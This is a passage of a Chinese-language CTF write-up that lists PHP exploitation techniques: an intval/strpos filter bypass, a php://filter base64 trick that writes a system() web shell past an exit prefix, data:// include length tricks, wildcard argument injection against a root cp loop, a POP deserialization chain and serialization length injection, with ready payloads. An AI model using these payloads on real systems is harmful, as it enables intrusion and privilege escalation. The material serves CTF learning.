## 二、知识点

### 1. `intval($num, 0)` 的八进制

```text
411413 十进制 = 01443425 八进制
intval("01443425", 0) = 411413
```

`intval` 第二参数为 `0` 时自动判断进制：

```text
0x... -> 十六进制
0b... -> 二进制
0...  -> 八进制
其他  -> 十进制
```

### 2. `strpos($num, "0")` 的 0 下标陷阱

```php
if (!strpos($num, "0")) {
    die("玉米说以防万一再试试这个!!!");
}
```

- `"01443425"`：`0` 在下标 0，`strpos` 返回 `0`，`!0` 为真 → die；
- `"+01443425"`：`+` 把 `0` 挤到下标 1，`strpos` 返回 `1`，通过；
- `intval` 会跳过 `+`，仍按八进制解析成 `411413`；
- `+01443425 == 411413` 为 false，因为 PHP 松散比较按十进制理解，值是 `1443425`。

最终 payload：

```text
?num=%2B01443425
```

### 3. `file_put_contents` 前置 `<?php exit;?>` 绕过

源码：

```php
$written = @file_put_contents(
    $filename,
    "<?php exit;?>" . $content
);
```

直接写 `abc.php` 会被 `exit` 挡住。

用 `php://filter` 在**写入时** base64 解码：

```text
filename = php://filter/convert.base64-decode/resource=abc.php
content  = A + base64(<?php system($_GET['c']);?>)
```

为什么加 `A`：

- 前缀 `<?php exit;?>` 里合法 base64 字符是 `phpexit`，共 **7** 个；
- 加一个 `A` 对齐成 8 个；
- 后面 36 个字符的木马 base64 才能按 4 字符一组正确解码；
- 解码结果是 `6 字节垃圾 + <?php system($_GET['c']);?>`。

payload：

```text
content=APD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8%2B
```

写入后访问：

```text
abc.php?c=ls%20/
abc.php?c=cat</flag
```

### 4. `php://filter` 写入 vs `data://` include

| wrapper | 作用 | 前缀长度 |
|---|---|---|
| `php://filter/convert.base64-decode/resource=` | 写入时解码 | 45 |
| `data://text/plain;base64,` | include 时解码 | **25** |

`data://text/plain;base64,` 正好 25 字符，所以能卡 `substr($file, 25)`；`php://filter` 的 45 字符对不上。

### 5. root 循环参数注入

`/start.sh`：

```bash
cd /var/www/html/primary
while :; do
    cp -P * /var/www/html/marstream/
    chmod 755 -R /var/www/html/marstream/
    sleep 5s
done
```

- `primary` 777，www-data 可写；
- `marstream` 755，root 写、www-data 读；
- root 每 5 秒把 `primary` 同步到 `marstream`。

在 `primary` 放：

```text
z -> /tmp/flag
-L
```

`*` 展开成 `-L z`：

```bash
cp -P -L z /var/www/html/marstream/
```

`-L` 覆盖 `-P`，root 跟随 `z` 读取 `/tmp/flag`，写成普通文件 `marstream/z`；再 `chmod 755` 让 www-data 可读。

`touch ./-L` 的 `./` 防止 `touch` 把 `-L` 当选项；但 root 的 `*` 展开成裸文件名 `-L`，`cp` 就把它当选项。

### 6. ez_pop 魔术方法链

```text
A::__destruct
  -> B::__toString
    -> C::__invoke
      -> D::__call
        -> E::__get
          -> F::__set
            -> system
```

关键条件：

- `B->action` 是 C，C 有 `__invoke`；
- `C->target` 是 D，D 有 `__call`，`method='x'` 不存在；
- `D->next` 是 E，`property='x'` 不存在；
- `E->sink` 是 F，`cmd='cat</flag'`；
- F 的 `flag_trigger` 是 private，E 从类外写触发 `__set`。

### 7. ez_pop 长度注入

```php
$s = serialize($b);
$s = str_replace('O:1:"B":1:', 'O:1:"B":2:', $s);

$m = '";s:4:"sign";' . $s;
$user = str_repeat('admin', strlen($m)) . $m;
```

- `admin` 5 → `hacker` 6，每个 +1；
- N 个 `admin` 多 N 字节；
- 声明长度 `6N`，实际 `7N`；
- `unserialize` 只读 `6N`，剩下 N 字节是 `$m`；
- `$m` 开头的 `"` 闭合 user，`;` 结束 user 属性，`s:4:"sign";` 是第二个属性名，`$s` 是第二个属性值。

## 三、踩坑

| 坑 | 现象 | 解决 |
|---|---|---|
| `;` 没编码 | `blocked` | 用 `%3B` |
| `&` 没编码 | HTTP 500 | 用 `;` 或 `--data-urlencode` |
| `catt` 拼错 | 空白 | 拼写检查 |
| `?` 写成 `&` | `c` 不是 GET 参数 | `/abc.php?c=...` |
| `data://text/plain;base64,,` 多逗号 | `blocked` | 只留一个逗号 |
| `touch -L` 少了 `./` | `touch` 把 `-L` 当选项 | `touch ./-L` |
| `z` 已存在 | `ln` 报错 | 换名字或 `ln -sf` |
| `-L` 没生效 | `marstream/z` 还是链接 | 用 `--dereference` 或检查 `cp` 行为 |
